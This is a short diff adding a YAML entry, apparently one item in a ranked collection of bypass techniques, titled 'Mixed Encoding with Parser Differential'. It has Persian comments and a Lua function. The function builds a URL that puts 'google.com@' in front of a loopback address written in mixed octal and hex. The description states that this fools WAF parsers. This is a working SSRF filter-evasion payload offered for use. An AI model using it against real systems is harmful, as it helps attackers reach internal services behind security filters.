@@ -1,0 +1,12 @@
+meta:
+  name: "Mixed Encoding with Parser Differential"
+  date: "2026-06-20" # تاریخ جدیدتر برای تست منطق زمانی تو
+  rank: 95            # امتیاز بالاتر
+  description: "Combines Octal/Hex and uses the @ character to fool WAF parsers"
+
+script: |
+  function bypass(target)
+      -- ترکیب اکتال و هگز به همراه دامنه فریب‌دهنده
+      local obfuscated_ip = "0177.0x0.0.1"
+      return "http://google.com@" .. obfuscated_ip
+  end
